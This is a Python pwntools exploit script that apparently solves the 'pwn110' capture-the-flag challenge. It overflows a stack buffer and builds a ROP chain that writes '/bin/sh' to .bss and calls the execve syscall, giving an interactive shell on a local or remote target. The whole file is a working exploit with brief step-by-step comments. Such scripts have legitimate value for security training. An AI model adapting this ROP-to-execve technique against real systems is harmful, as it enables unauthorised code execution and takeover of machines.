import sys
from struct import *

from pwn import *

context(os="linux", arch="amd64")

elf = ELF("./pwn110-1644300525386.pwn110")
context.binary = binary = elf
# context.log_level = "debug"


def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([binary.path] + argv, *a, **kw)


io = start()

io.recvuntil(b"libc")
io.recv()


rop = ROP(binary)
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
mov_rdi_rdx = 0x4340A3  # mov qword ptr[rdi], rdx; ret;
syscall = rop.find_gadget(["syscall", "ret"])[0]


payload = b""
payload += b"A" * 0x20
payload += b"B" * 0x8


# Write "/bin/sh" to .bss (place text data is store )
payload += p64(pop_rdi)  # .bss -> rdi /// load addres bss to rdi
payload += p64(binary.bss())
payload += p64(pop_rdx)
payload += b"/bin/sh\x00"  # complete 8 byte
payload += p64(
    mov_rdi_rdx
)  # We load /bin/sh store in rdx to rdi pointer which is memory of  .bss land

# we call syscall with parameter 59 which is execve
# we call syscall with parameter 59 which is execve
# execve is gonna execute execve(rdi,rsi,rdx)
# ----------------------> execve("/bin/sh", 0 , 0)

payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_rax)  # rax = 59 (execve's syscall code)
payload += p64(59)
payload += p64(syscall)  # syscall


io.sendline(payload)
io.interactive()
